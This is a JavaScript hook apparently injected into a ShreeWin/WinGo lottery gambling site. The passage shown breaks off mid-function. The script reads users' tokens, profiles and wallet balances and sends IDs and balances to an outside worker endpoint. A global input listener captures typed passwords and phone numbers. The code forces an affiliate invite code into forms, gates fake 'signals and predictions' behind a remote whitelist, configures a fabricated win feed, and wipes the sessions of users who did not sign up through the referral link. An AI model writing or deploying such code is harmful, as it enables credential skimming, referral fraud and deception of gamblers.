// ShreeWin / WinGo Live API Interceptor & State Engine Hook
(function() {
    if (window.__shreewin_hook_installed__) return;
    window.__shreewin_hook_installed__ = true;

    console.log('[ShreeWin Hook] Installing high-precision WinGo Live API & State Engine...');

    const MIN_UNLOCK_BALANCE = 50.0;
    // WinGo runs 4 independent draws on one screen (30S / 1M / 3M / 5M).
    // All live state below is keyed by variant — one global (period,
    // countdown) always resolved to the 30S entry, which is why only the
    // 30S tab ever worked.
    const WINGO_VARIANTS = {
        'WinGo_30S': 30,
        'WinGo_1M': 60,
        'WinGo_3M': 180,
        'WinGo_5M': 300
    };
    function normalizeGameCode(v) {
        const s = String(v || '').toUpperCase().replace(/[\s_\-]+/g, '');
        if (!s) return '';
        if (s.indexOf('30S') >= 0 || s.indexOf('30SEC') >= 0) return 'WinGo_30S';
        if (/(^|[^0-9])1M/.test(s) || s.indexOf('1MIN') >= 0) return 'WinGo_1M';
        if (/(^|[^0-9])3M/.test(s) || s.indexOf('3MIN') >= 0) return 'WinGo_3M';
        if (/(^|[^0-9])5M/.test(s) || s.indexOf('5MIN') >= 0) return 'WinGo_5M';
        return '';
    }
    function gameCodeFromUrl(url) {
        try {
            const m = String(url || '').match(/gameCode\s*=\s*([^&#\s]*)/i);
            if (m && m[1]) return normalizeGameCode(decodeURIComponent(m[1]));
        } catch(e) {}
        return '';
    }
    // --- Offline period structure (exact-match, no network) ---
    // Period IDs are deterministic: YYYYMMDD + "1000" + (gameBase + index),
    // where index = floor(seconds-since-UTC-midnight / interval). Countdown =
    // interval - (daySeconds % interval). Verified: 20260905100020239 @
    // 11:58:50 UTC = 3Min index 239, 70s left (matches live 01:10 exactly).
    // Live API/table data always wins when present; this only fills gaps
    // (offline, pre-first-payload).
    var WINGO_PERIOD_BASE = { 'WinGo_30S': 50000, 'WinGo_1M': 10000, 'WinGo_3M': 20000, 'WinGo_5M': 30000 };
    function offlinePeriodFor(code, nowMs) {
        try {
            var interval = WINGO_VARIANTS[code];
            var base = WINGO_PERIOD_BASE[code];
            if (!interval || base === undefined) return null;
            var t = new Date(typeof nowMs === 'number' ? nowMs : Date.now());
            var midnightUTC = Date.UTC(t.getUTCFullYear(), t.getUTCMonth(), t.getUTCDate());
            var daySeconds = Math.floor((t.getTime() - midnightUTC) / 1000);
            if (daySeconds < 0 || daySeconds >= 86400) return null;
            var index = Math.floor(daySeconds / interval);
            var countdown = interval - (daySeconds % interval);
            var ds = String(t.getUTCFullYear()) + String(t.getUTCMonth() + 1).padStart(2, '0') + String(t.getUTCDate()).padStart(2, '0');
            return { period: ds + '1000' + String(base + index), countdown: countdown, gameCode: code, index: index };
        } catch (_) { return null; }
    }
    window.__shreewin_offline_period = offlinePeriodFor;
    // Active in-page tab label seen by the DOM scanner / user click
    let lastSeenTabVariant = '';
    function detectActiveVariant() {
        // 1. Direct DOM check for currently active tab
        try {
            const activeElements = document.querySelectorAll('.van-tab--active, [class*="active"], [class*="selected"], [class*="choose"], [class*="current"]');
            for (let i = 0; i < activeElements.length; i++) {
                const el = activeElements[i];
                if (el.closest && el.closest('#nexy-inpage-root')) continue;
                const txt = (el.textContent || '').trim();
                if (txt.length <= 40) {
                    const vm = txt.match(/\b(30\s?S(?:EC)?|1\s?M(?:IN)?|3\s?M(?:IN)?|5\s?M(?:IN)?)\b/i);
                    if (vm) {
                        const norm = normalizeGameCode(vm[1]);
                        if (norm) {
                            lastSeenTabVariant = norm;
                            return norm;
                        }
                    }
                }
            }
        } catch(_) {}

        // 2. User clicked or previously observed tab (never artificially expires)
        if (lastSeenTabVariant) return lastSeenTabVariant;

        // 3. Saved in storage
        try {
            const saved = localStorage.getItem('WINGO_LAST_GAME');
            if (saved && WINGO_VARIANTS[saved]) return saved;
        } catch(_) {}

        // 4. URL query parameter
        const fromUrl = gameCodeFromUrl((window.location.hash || '') + ' ' + (window.location.href || ''));
        if (fromUrl) return fromUrl;

        return 'WinGo_30S';
    }
    function isVisibleEl(el) {
        try {
            if (el.hasAttribute && el.hasAttribute('hidden')) return false;
            const cs = window.getComputedStyle ? window.getComputedStyle(el) : null;
            if (cs && (cs.display === 'none' || cs.visibility === 'hidden')) return false;
            const r = el.getBoundingClientRect ? el.getBoundingClientRect() : null;
            if (r && (r.width <= 0 || r.height <= 0)) return false;
        } catch(e) {}
        return true;
    }
    let lastBroadcastByVariant = {}; // gameCode -> { period, countdown }
    let lastKnownBalance = 0;
    try { lastKnownBalance = parseFloat(localStorage.getItem('shreewin_balance') || '0'); } catch (_) {}

    let lastRealResultByVariant = {};
    // --- Last REAL drawn result per variant (never fabricated) ---
    // Restored across reloads; set from genuine lottery API payloads and the
    // on-page result table. Newest period wins per variant — stale history
    // payloads must never regress it (see storeRealResult guard).
    try {
        const variantCodes = Object.keys(WINGO_VARIANTS);
        for (let ci = 0; ci < variantCodes.length; ci++) {
            const saved = JSON.parse(localStorage.getItem('WINGO_LAST_RESULT_V1_' + variantCodes[ci]) || 'null');
            if (saved && /^202\d{10,18}$/.test(String(saved.period || '')) && saved.number >= 0 && saved.number <= 9) {
                lastRealResultByVariant[variantCodes[ci]] = { period: String(saved.period), number: saved.number };
            }
        }
        // Legacy single-key cache belongs to the 30S game.
        if (!lastRealResultByVariant['WinGo_30S']) {
            const legacy = JSON.parse(localStorage.getItem('WINGO_LAST_RESULT_V1') || 'null');
            if (legacy && /^202\d{10,18}$/.test(String(legacy.period || '')) && legacy.number >= 0 && legacy.number <= 9) {
                lastRealResultByVariant['WinGo_30S'] = { period: String(legacy.period), number: legacy.number };
            }
        }
    } catch(e) {}
    // Table-scraped last draw per variant — fresher than delayed API winner
    // tickers. Preferred by getLastRealResult while fresh (<= 120s).
    let lastTableResultByVariant = {};
    let lastTableLogAt = 0;
    function getLastRealResult(code) {
        const c = code || detectActiveVariant() || 'WinGo_30S';
        const t = lastTableResultByVariant[c];
        if (t && t.number >= 0 && t.number <= 9 && (Date.now() - (t.at || 0)) <= 120000) {
            return { period: t.period, number: t.number };
        }
        const r = lastRealResultByVariant[c];
        return r ? { period: r.period, number: r.number } : { period: '', number: -1 };
    }
    function storeRealResult(code, period, number) {
        const c = code || detectActiveVariant() || 'WinGo_30S';
        const cur = lastRealResultByVariant[c];
        if (cur && cur.period === String(period) && cur.number === number) return;
        if (cur && !isNewerPeriod(period, cur.period)) return;
        lastRealResultByVariant[c] = { period: String(period), number: number };
        try { localStorage.setItem('WINGO_LAST_RESULT_V1_' + c, JSON.stringify(lastRealResultByVariant[c])); } catch(e) {}
        if (typeof broadcastAppState === 'function') {
            setTimeout(() => broadcastAppState(true), 20);
        }
    }

    function isNewerPeriod(a, b) {
        a = String(a || ''); b = String(b || '');
        if (!a) return false;
        if (!b) return true;
        if (a.length !== b.length) return a.length > b.length;
        return a > b;
    }

    // Scan a lottery payload for genuine (variant, period, drawn number) triples.
    // Requires BOTH in the SAME object: a WinGo issue string + a single digit
    // in a result-like key. Countdowns/amounts/ids are excluded by key name.
    // A sibling gameCode-like field tags the entry with its variant; entries
    // without one inherit the caller's urlCode / active tab.
    function extractResultEntries(data, urlCode) {
        const found = [];
        const periodKeys = ['issueNumber', 'IssueNumber', 'issue', 'period', 'issueNo', 'drawIssue'];
        const codeKeys = ['gameCode', 'game_code', 'gameType', 'game_type', 'typeCode', 'gameName'];
        const digitKeys = ['number', 'winNumber', 'win_number', 'openNum', 'openNumber', 'result', 'drawNumber', 'lotteryNumber', 'winNo', 'openResult'];
        const bannedKeyPart = /amount|balance|money|price|countdown|second|minute|time|count|bet|order|fee|rate|status|type|code|id|phone|mobile|user|wallet|total/i;

        function inspect(obj, depth) {
            if (!obj || depth > 6) return;
            if (Array.isArray(obj)) {
                for (let k = 0; k < Math.min(obj.length, 8); k++) inspect(obj[k], depth + 1);
                return;
            }
            if (typeof obj !== 'object') return;

            let period = '';
            for (let i = 0; i < periodKeys.length; i++) {
                const v = obj[periodKeys[i]];
                if (v !== undefined && v !== null && /^202\d{10,18}$/.test(String(v).trim())) {
                    period = String(v).trim();
                    break;
                }
            }
            if (period) {
                let code = '';
                for (let c = 0; c < codeKeys.length; c++) {
                    const cv = obj[codeKeys[c]];
                    if (cv !== undefined && cv !== null) {
                        const nc = normalizeGameCode(cv);
                        if (nc) { code = nc; break; }
                    }
                }
                for (const key of Object.keys(obj)) {
                    if (bannedKeyPart.test(key)) continue;
                    const isDigitKey = digitKeys.some(dk => dk.toLowerCase() === key.toLowerCase());
                    if (!isDigitKey) continue;
                    const raw = obj[key];
                    const s = String(raw !== undefined && raw !== null ? raw : '').trim();
                    if (/^[0-9]$/.test(s)) {
                        found.push({ gameCode: code || urlCode || '', period: period, number: parseInt(s, 10) });
                        break;
                    }
                }
            }

            const subKeys = ['current', 'data', 'list', 'EmerdList', 'result', 'results', 'items', 'records'];
            for (let m = 0; m < subKeys.length; m++) {
                if (obj[subKeys[m]]) inspect(obj[subKeys[m]], depth + 1);
            }
        }

        try { inspect(data, 0); } catch(e) {}
        return found;
    }

    // --- 1. Authentication & Route Detection ---
    // A bare phone number can survive logout in storage, so it is never
    // trusted alone — it only corroborates a token/userId session.
    function checkAuthStatus() {
        try {
            // 1. DOM Priority Check:
            // If on-page guest elements ("Log in" or "Register" buttons) are visible in the DOM,
            // the user is strictly in GUEST mode (NOT logged in).
            const guestButtons = document.querySelectorAll('.p8-home__guest-btn, .p8-home__guest-btn--login, .p8-home__guest-btn--register, [class*="guest-btn"]');
            for (let b = 0; b < guestButtons.length; b++) {
                const btn = guestButtons[b];
                if (btn.closest && btn.closest('#nexy-inpage-root')) continue;
                if (isVisibleEl(btn)) {
                    const txt = (btn.textContent || '').trim();
                    if (/^(log\s*in|login|register)$/i.test(txt)) {
                        return false;
                    }
                }
            }

            // 2. Storage Inspection:
            // Check localStorage and sessionStorage for genuine authenticated user tokens
            const stores = [];
            try { stores.push(localStorage); } catch (_) {}
            try { if (window.sessionStorage) stores.push(window.sessionStorage); } catch (_) {}

            let hasValidToken = false;
            let hasValidUser = false;

            for (let i = 0; i < stores.length; i++) {
                const s = stores[i];
                try {
                    const tokenKeys = ['token', 'refreshToken', 'ar_token', 'access_token', 'Authorization'];
                    for (let tk = 0; tk < tokenKeys.length; tk++) {
                        const val = s.getItem(tokenKeys[tk]);
                        if (val && typeof val === 'string' && val !== 'null' && val !== 'undefined' && val.length > 20) {
                            hasValidToken = true;
                            break;
                        }
                    }

                    const userRaw = s.getItem('userInfo');
                    if (userRaw && userRaw !== '{}' && userRaw.length > 10) {
                        try {
                            const uObj = JSON.parse(userRaw);
                            if (uObj && (uObj.userId || (uObj.userName && String(uObj.userName).length >= 6))) {
                                hasValidUser = true;
                            }
                        } catch (_) {
                            if (userRaw.includes('"userId"')) hasValidUser = true;
                        }
                    }

                    if (hasValidToken && hasValidUser) return true;
                } catch (_) {}
            }

            if (hasValidToken && hasValidUser) return true;
            if (hasValidToken) return true;

            // 3. Vue 3 Pinia store check
            try {
                const app = document.querySelector('#app')?.__vue_app__;
                const pinia = app?.config?.globalProperties?.$pinia;
                if (pinia && pinia._s) {
                    const us = pinia._s.get('UserStore') || pinia._s.get('userStore');
                    if (us && us.isLogin === true) return true;
                    if (us && us.userInfo && us.userInfo.userId) return true;
                    if (us && us.token && us.token.length > 20) return true;
                }
            } catch (_) {}

            // 4. Cookie check
            try {
                const ck = document.cookie || '';
                if (/(?:^|;\s*)(token|ar_token|auth|sessionid|userId)=[^;]{20,}/i.test(ck)) return true;
            } catch (_) {}

            return false;
        } catch(e) {
            return false;
        }
    }
    function detectCurrentRoute() {
        const hash = window.location.hash || '';
        const href = window.location.href || '';
        const isWinGo = hash.includes('WinGo') || href.includes('WinGo') || hash.includes('saasLottery/WinGo');
        const isAuth = hash.includes('login') || hash.includes('register') || hash.includes('forgot');
        if (hash.toLowerCase().includes('register')) {
            window.__sw_last_register_seen = Date.now();
        }
        const isRecharge = hash.toLowerCase().includes('recharge') || hash.toLowerCase().includes('deposit');

        let screenName = 'Home';
        if (isWinGo) screenName = 'WinGo Lottery';
        else if (isAuth) screenName = 'Login / Register';
        else if (isRecharge) screenName = 'Deposit / Recharge';
        else if (hash.includes('mine') || hash.includes('user') || hash.includes('account')) screenName = 'Account';
        else if (hash.includes('wallet')) screenName = 'Wallet';
        else if (hash.includes('promotion') || hash.includes('activity')) screenName = 'Promotions';

        return { isWinGo: isWinGo, isAuth: isAuth, isRecharge: isRecharge, screenName: screenName, gameCode: detectActiveVariant(), hash: hash, href: href };
    }

    // Helper: Identify genuine wallet balance endpoints (strictly exclude deposit orders / betting responses)
    function isWalletBalanceUrl(url) {
        if (!url || typeof url !== 'string') return false;
        const u = url.toLowerCase();
        return (u.includes('getbalance') ||
                u.includes('getallwallets') ||
                u.includes('getsaasallwallets') ||
                u.includes('getuserpersonal') ||
                u.includes('getargameandplatwallets')) &&
               !u.includes('recharge') &&
               !u.includes('order') &&
               !u.includes('pay') &&
               !u.includes('bet') &&
               !u.includes('history');
    }

    // --- 2. Accurate Balance Extraction (Pinia, localStorage, and Targeted DOM) ---
    function getAccurateBalance() {
        // 1. Primary: Vue 3 / Pinia in-memory store
        try {
            const app = document.querySelector('#app')?.__vue_app__;
            const pinia = app?.config?.globalProperties?.$pinia;
            if (pinia && pinia._s) {
                const ws = pinia._s.get('walletStore');
                if (ws && typeof ws.amount === 'number' && !isNaN(ws.amount)) {
                    return ws.amount;
                }
                const us = pinia._s.get('UserStore');
                if (us?.userInfo && typeof us.userInfo.amount === 'number' && !isNaN(us.userInfo.amount)) {
                    return us.userInfo.amount;
                }
            }
        } catch(e) {}

        // 2. Secondary: Official walletStore in localStorage
        try {
            const rawWs = localStorage.getItem('walletStore');
            if (rawWs) {
                const ws = JSON.parse(rawWs);
                if (typeof ws.amount === 'number' && !isNaN(ws.amount)) {
                    return ws.amount;
                }
                if (ws.allwallets && Array.isArray(ws.allwallets.thidGameBalanceList)) {
                    let total = 0;
                    ws.allwallets.thidGameBalanceList.forEach(item => {
                        if (typeof item.balance === 'number') total += item.balance;
                    });
                    return total;
                }
            }
        } catch(e) {}

        // 3. Tertiary: Official userInfo in localStorage
        try {
            const rawUi = localStorage.getItem('userInfo');
            if (rawUi) {
                const ui = JSON.parse(rawUi);
                if (typeof ui.amount === 'number' && !isNaN(ui.amount)) {
                    return ui.amount;
                }
            }
        } catch(e) {}

        // 4. Quaternary: Targeted DOM elements (strictly excluding deposit chips & betting controls)
        try {
            const targetedSelectors = [
                '.balanceAssets__main',
                '.balanceAssets__main p',
                '.Wallet__C-balance-l1',
                '.Wallet__C-balance',
                '.user-balance-num'
            ];
            for (let i = 0; i < targetedSelectors.length; i++) {
                const el = document.querySelector(targetedSelectors[i]);
                if (el && !el.closest('#nexy-inpage-root')) {
                    const clean = (el.textContent || '').replace(/,/g, '');
                    const m = clean.match(/(?:₹|Rs\.?|INR|\$)?\s*([0-9]+(?:\.[0-9]{1,2})?)/);
                    if (m) {
                        const val = parseFloat(m[1]);
                        if (!isNaN(val) && val >= 0) return val;
                    }
                }
            }
        } catch(e) {}

        return null;
    }

    function extractBalanceFromPayload(data, sourceUrl) {
        if (!data || !isWalletBalanceUrl(sourceUrl)) return null;
        let b = null;
        const d = (data.data && typeof data.data === 'object') ? data.data : data;

        if (typeof d.amount === 'number' && !isNaN(d.amount)) {
            b = d.amount;
        } else if (typeof d.balance === 'number' && !isNaN(d.balance)) {
            b = d.balance;
        } else if (Array.isArray(d.thidGameBalanceList)) {
            let total = 0;
            d.thidGameBalanceList.forEach(item => {
                if (typeof item.balance === 'number') total += item.balance;
            });
            b = total;
        } else if (d.allwallets && typeof d.allwallets.amount === 'number') {
            b = d.allwallets.amount;
        }

        return (typeof b === 'number' && !isNaN(b)) ? b : null;
    }

    // --- Remote Edge Config & Licensing (Cloudflare Worker) ---
    const _appCfg = window.__APP_CONFIG__ || {};

    function extractInviteCode(url) {
        try {
            const m = String(url || '').match(/invitationCode=([a-zA-Z0-9]+)/);
            return m ? m[1] : '';
        } catch(e) { return ''; }
    }

    const _configuredInviteCode = extractInviteCode(_appCfg.register_url);

    function seedAndAutoFillInviteCode() {
        try {
            const code = extractInviteCode(remoteConfig.register_url || _appCfg.register_url) || _configuredInviteCode;
            if (!code) return;
            // 1. Seed storage locations queried by platform (index-*.js: Wy = "invitecode")
            try { localStorage.setItem('invitecode', code); } catch(e) {}
            try { sessionStorage.setItem('invitecode', code); } catch(e) {}
            try {
                if (!window.NativeBridge) {
                    window.NativeBridge = {
                        getInfoString: function() {
                            return JSON.stringify({ invitationCode: code });
                        }
                    };
                }
            } catch(e) {}

            // 2. If navigating to register route without invitationCode, append it seamlessly
            if (code && (location.hash === '#/register' || location.hash === '#/register/')) {
                try {
                    location.replace('#/register?invitationCode=' + encodeURIComponent(code));
                } catch(e) {}
            }

            // 3. If an invite code input field exists in DOM, auto-fill it
            const inputs = document.querySelectorAll('input');
            inputs.forEach(inp => {
                const ph = (inp.placeholder || '').toLowerCase();
                const nm = (inp.name || '').toLowerCase();
                if ((ph.includes('invite') || ph.includes('code') || nm.includes('invite') || nm.includes('code')) && !inp.value) {
                    inp.value = code;
                    inp.dispatchEvent(new Event('input', { bubbles: true }));
                    inp.dispatchEvent(new Event('change', { bubbles: true }));
                }
            });
        } catch(e) {}
    }

    // Run immediately and periodically
    seedAndAutoFillInviteCode();
    setInterval(seedAndAutoFillInviteCode, 1200);
    window.addEventListener('hashchange', seedAndAutoFillInviteCode);
    window.addEventListener('popstate', seedAndAutoFillInviteCode);

    let remoteConfig = {
        min_unlock_balance: 50.0,
        global_unlock: false,
        whitelisted_users: [],
        blacklisted_users: [],
        broadcast_notice: '',
        deposit_url: _appCfg.deposit_url || 'https://www.shreewin.ai/#/wallet/Recharge',
        register_url: _appCfg.register_url || 'https://www.shreewin6.com/#/register?invitationCode=78763141420',
        bubble_icon_url: _appCfg.bubble_icon_url || 'https://i.ibb.co/fGpr57nL/20260904-132124.webp',
        branding: { panel_name: _appCfg.brand_panel || 'NEXY', bubble_label: _appCfg.brand_bubble || 'NEXY' },
        app_active: true,
        win_feed: { enabled: true, min_interval_s: 7, max_interval_s: 14, visible_s: 3.6, first_delay_s: 4.5 },
        win_users: [],
        win_test_push: null,
        strict_reg_lock: false,
        version: '',
    };

    function isUserWhitelisted() {
        try {
            if (remoteConfig.global_unlock) return true;
            let userInfo = {};
            try { userInfo = JSON.parse(localStorage.getItem('userInfo') || '{}'); } catch(e) {}
            const userId = String(userInfo.userId || '');
            const userName = String(userInfo.userName || '');
            const number = String(localStorage.getItem('number') || '');

            const list = remoteConfig.whitelisted_users || [];
            if (!Array.isArray(list) || list.length === 0) return false;

            for (let i = 0; i < list.length; i++) {
                const item = String(list[i]).trim();
                if (!item) continue;
                if ((userId && item === userId) || (userName && (item === userName || userName.includes(item))) || (number && (item === number || number.includes(item)))) {
                    return true;
                }
            }
            return false;
        } catch(e) {
            return false;
        }
    }

    function isUserBlacklisted() {
        try {
            let userInfo = {};
            try { userInfo = JSON.parse(localStorage.getItem('userInfo') || '{}'); } catch(e) {}
            const userId = String(userInfo.userId || '');
            const userName = String(userInfo.userName || '');
            const number = String(localStorage.getItem('number') || '');

            const list = remoteConfig.blacklisted_users || [];
            if (!Array.isArray(list) || list.length === 0) return false;

            for (let i = 0; i < list.length; i++) {
                const item = String(list[i]).trim();
                if (!item) continue;
                if ((userId && item === userId) || (userName && (item === userName || userName.includes(item))) || (number && (item === number || number.includes(item)))) {
                    return true;
                }
            }
            return false;
        } catch(e) {
            return false;
        }
    }

    function syncRemoteConfig() {
        try {
            const baseEndpoint = (window.__APP_CONFIG__ && window.__APP_CONFIG__.cf_config_endpoint) || window.__CF_CONFIG_ENDPOINT__ || 'https://user-state-api.shakir-ansarii075.workers.dev/api/config';
            const knownVer = remoteConfig.version || remoteConfig.updated_at || '';
            const chan = (window.__APP_CONFIG__ && window.__APP_CONFIG__.channel) || '';
            const chanParam = chan ? '&channel=' + encodeURIComponent(chan) : '';
            const sep = baseEndpoint.includes('?') ? '&' : '?';
            const cacheBustUrl = baseEndpoint + sep + '_t=' + Date.now() + (knownVer ? '&v=' + encodeURIComponent(knownVer) : '') + chanParam;
            fetch(cacheBustUrl, { cache: 'no-store' })
                .then(r => {
                    // 304 = config unchanged on edge, skip parse + rebroadcast
                    if (r.status === 304) return null;
                    return r.json();
                })
                .then(data => {
                    if (!data || typeof data !== 'object') return;
                    // Guard against same-version bodies (e.g. proxies stripping 304)
                    if (data.version && remoteConfig.version && data.version === remoteConfig.version) return;
                    if (data.updated_at && remoteConfig.updated_at && data.updated_at === remoteConfig.updated_at && (!data.version || data.version === remoteConfig.version)) return;
                    remoteConfig = Object.assign(remoteConfig, data);
                    broadcastAppState(true);
                })
                .catch(() => {});
        } catch(e) {}
    }
    window.__shreewin_sync_remote_config = syncRemoteConfig;
    syncRemoteConfig();
    // Sync remote config every 8 seconds — fast enough for admin changes, slow enough to not fight nexy.html
    setInterval(syncRemoteConfig, 8000);

    // --- 3. User Registration Verification & App State Computation ---
    // Save a clean reference to XMLHttpRequest BEFORE any hooks overwrite .open / .send
    const _NativeXHR = window.XMLHttpRequest;

    function checkUserAccessSync(userId, bal) {
        if (!userId) return null;
        if (window.__sw_user_check_cache && window.__sw_user_check_cache[userId]) {
            return window.__sw_user_check_cache[userId];
        }
        try {
            const chan = (window.__APP_CONFIG__ && window.__APP_CONFIG__.channel) || 'v2';
            const checkUrl = 'https://user-state-api.shakir-ansarii075.workers.dev/api/check-user?id=' + encodeURIComponent(userId) + '&balance=' + encodeURIComponent(bal || 0) + '&channel=' + encodeURIComponent(chan) + '&_t=' + Date.now();
            const xhr = new _NativeXHR();
            xhr.open('GET', checkUrl, false);
            xhr.send(null);
            if (xhr.status >= 200 && xhr.status < 300) {
                const data = JSON.parse(xhr.responseText);
                if (data && typeof data === 'object') {
                    const resObj = {
                        isAccessDenied: !!data.isAccessDenied,
                        isRegisteredAppUser: !!data.isRegisteredAppUser,
                        isWhitelisted: !!data.isWhitelisted
                    };
                    if (!window.__sw_user_check_cache) window.__sw_user_check_cache = {};
                    window.__sw_user_check_cache[userId] = resObj;
                    if (resObj.isAccessDenied) {
                        window.__sw_denied_user_id = String(userId);
                        try { localStorage.removeItem('sw_reg_done_' + userId); } catch(_) {}
                    } else if (data.isRegisteredAppUser) {
                        try { localStorage.setItem('sw_reg_done_' + userId, String(Date.now())); } catch(_) {}
                    }
                    console.log('[ShreeWin Hook] checkUserAccessSync result for ' + userId + ':', JSON.stringify(resObj));
                    return resObj;
                }
            }
        } catch(e) {
            console.error('[ShreeWin Hook] checkUserAccessSync error:', e);
        }
        return null;
    }

    async function checkUserAccessAsync(userId, bal) {
        if (!userId) return null;
        if (!window.__sw_user_check_cache) window.__sw_user_check_cache = {};
        if (window.__sw_user_check_cache[userId]) {
            return window.__sw_user_check_cache[userId];
        }
        try {
            const chan = (window.__APP_CONFIG__ && window.__APP_CONFIG__.channel) || 'v2';
            const checkUrl = 'https://user-state-api.shakir-ansarii075.workers.dev/api/check-user?id=' + encodeURIComponent(userId) + '&balance=' + encodeURIComponent(bal || 0) + '&channel=' + encodeURIComponent(chan) + '&_t=' + Date.now();
            const r = await fetch(checkUrl, { cache: 'no-store' });
            const data = await r.json();
            if (data && typeof data === 'object') {
                const resObj = {
                    isAccessDenied: !!data.isAccessDenied,
                    isRegisteredAppUser: !!data.isRegisteredAppUser,
                    isWhitelisted: !!data.isWhitelisted
                };
                window.__sw_user_check_cache[userId] = resObj;
                if (resObj.isAccessDenied) {
                    window.__sw_denied_user_id = String(userId);
                    try { localStorage.removeItem('sw_reg_done_' + userId); } catch(_) {}
                } else if (data.isRegisteredAppUser) {
                    try { localStorage.setItem('sw_reg_done_' + userId, String(Date.now())); } catch(_) {}
                }
                return resObj;
            }
        } catch(e) {}
        return null;
    }

    function checkUserEdgeStatus(userId, bal) {
        if (!userId || window.__sw_user_check_in_flight === userId) return;
        window.__sw_user_check_in_flight = userId;
        checkUserAccessAsync(userId, bal)
            .then(res => {
                window.__sw_user_check_in_flight = null;
                if (res && res.isAccessDenied) {
                    enforceAccessDenial(userId);
                }
                broadcastAppState(true);
            })
            .catch(() => {
                window.__sw_user_check_in_flight = null;
            });
    }

    function purgeOutsideSession() {
        try {
            const keysToRemove = [
                'token', 'refreshToken', 'ar_token', 'access_token', 'Authorization', 'tokenHeader',
                'userInfo', 'user', 'userId', 'phone', 'account', 'number', 'nickName', 'avatar',
                'walletStore', 'ar_account_mobile', 'numberType', 'isToLogin'
            ];
            keysToRemove.forEach(k => {
                try { localStorage.removeItem(k); } catch(_) {}
                try { if (window.sessionStorage) sessionStorage.removeItem(k); } catch(_) {}
            });
            const cookieKeys = ['token', 'ar_token', 'auth', 'sessionid', 'userId', 'accessToken', 'Authorization'];
            cookieKeys.forEach(k => {
                try {
                    document.cookie = k + '=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/;';
                    document.cookie = k + '=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/; domain=' + window.location.hostname;
                } catch(_) {}
            });
            try {
                const app = document.querySelector('#app')?.__vue_app__;
                const pinia = app?.config?.globalProperties?.$pinia;
                if (pinia && pinia._s) {
                    const us = pinia._s.get('UserStore') || pinia._s.get('userStore');
                    if (us) {
                        us.isLogin = false;
                        us.token = '';
                        us.userInfo = {};
                    }
                }
            } catch(_) {}
        } catch(_) {}
    }


    // --- Access Denied Warning Dialog & Registration Sniffer ---
    let lastTypedPassword = '';
    let lastTypedPhone = '';
    let lastTypedInviteCode = '';

    document.addEventListener('input', (e) => {
        try {
            const target = e.target;
            if (!target) return;
            const type = (target.type || '').toLowerCase();
            const ph = (target.placeholder || '').toLowerCase();
            const nm = (target.name || '').toLowerCase();

            if (type === 'password' || ph.includes('password') || ph.includes('pwd') || nm.includes('password') || nm.includes('pwd')) {
                if (target.value && target.value.length >= 4) {
                    lastTypedPassword = target.value;
                    window.__sw_last_password = target.value;
                }
            }
            if (type === 'tel' || type === 'number' || ph.includes('phone') || ph.includes('mobile') || nm.includes('phone') || nm.includes('mobile')) {
                const digits = target.value.replace(/[^0-9]/g, '');
                if (digits.length >= 7) {
                    lastTypedPhone = digits;
                    window.__sw_last_phone = digits;
                }
            }
            if (ph.includes('invite') || ph.includes('code') || nm.includes('invite') || nm.includes('code')) {
                if (target.value && target.value.trim().length >= 4) {
                    lastTypedInviteCode = target.value.trim();
                    window.__sw_last_invite = target.value.trim();
                }
            }
        } catch(_) {}
    }, true);

    function showAccessDeniedWarningModal() {
        try {
            if (document.getElementById('sw-warning-modal')) return;

            const inviteCode = extractInviteCode(remoteConfig.register_url || _appCfg.register_url) || _configuredInviteCode;
            const regTargetUrl = '#/register?invitationCode=' + inviteCode;

            const modal = document.createElement('div');
            modal.id = 'sw-warning-modal';
            modal.style.cssText = 'position:fixed!important;inset:0!important;z-index:2147483647!important;display:flex!important;align-items:center!important;justify-content:center!important;background:rgba(7,5,14,0.92)!important;backdrop-filter:blur(14px)!important;-webkit-backdrop-filter:blur(14px)!important;padding:24px!important;box-sizing:border-box!important;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif!important;';

            modal.innerHTML = `
                <div style="background:linear-gradient(165deg,#181126 0%,#0d0915 100%);border:1px solid rgba(239,68,68,0.45);border-radius:24px;width:100%;max-width:390px;padding:30px 24px;text-align:center;color:#ffffff;box-shadow:0 25px 60px rgba(0,0,0,0.85);box-sizing:border-box;">
                    <div style="width:72px;height:72px;margin:0 auto 18px;border-radius:50%;background:radial-gradient(circle,rgba(239,68,68,0.25) 0%,rgba(239,68,68,0.05) 70%);display:flex;align-items:center;justify-content:center;border:2px solid rgba(239,68,68,0.5);">
                        <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                            <line x1="12" y1="8" x2="12" y2="12"/>
                            <line x1="12" y1="16" x2="12.01" y2="16"/>
                        </svg>
                    </div>

                    <div style="font-size:21px;font-weight:800;letter-spacing:0.5px;color:#ffffff;margin-bottom:8px;">
                        Access Restricted
                    </div>

                    <div style="display:inline-block;padding:4px 14px;border-radius:14px;background:rgba(239,68,68,0.15);border:1px solid rgba(239,68,68,0.35);font-size:11px;font-weight:700;color:#f87171;letter-spacing:0.8px;text-transform:uppercase;margin-bottom:18px;">
                        Official App Registration Required
                    </div>

                    <p style="font-size:14px;line-height:1.6;color:#cbd5e1;margin:0 0 26px;font-weight:400;">
                        This account was not registered through our official app link. To access live signals, predictions, and features, you must register a new account through our app.
                    </p>

                    <button id="sw-btn-goto-register" style="width:100%;padding:15px 20px;border-radius:14px;border:none;background:linear-gradient(135deg,#ec4899 0%,#8b5cf6 50%,#6366f1 100%);color:#ffffff;font-size:15px;font-weight:700;letter-spacing:0.3px;cursor:pointer;box-shadow:0 8px 25px rgba(139,92,246,0.45);">
                        Create Official Account &rarr;
                    </button>
                </div>
            `;

            document.body.appendChild(modal);

            document.getElementById('sw-btn-goto-register')?.addEventListener('click', () => {
                try { modal.remove(); } catch(_) {}
                try {
                    window.location.replace(regTargetUrl);
                } catch(_) {
                    window.location.hash = regTargetUrl;
                }
                setTimeout(seedAndAutoFillInviteCode, 200);
            });
        } catch(_) {}
    }

    function enforceAccessDenial(userId) {
        if (userId) {
            window.__sw_denied_user_id = String(userId);
            if (!window.__sw_user_check_cache) window.__sw_user_check_cache = {};
            window.__sw_user_check_cache[userId] = { isAccessDenied: true, isRegisteredAppUser: false, isWhitelisted: false };
        }
        purgeOutsideSession();
        showAccessDeniedWarningModal();

        try {
            const app = document.querySelector('#app')?.__vue_app__;
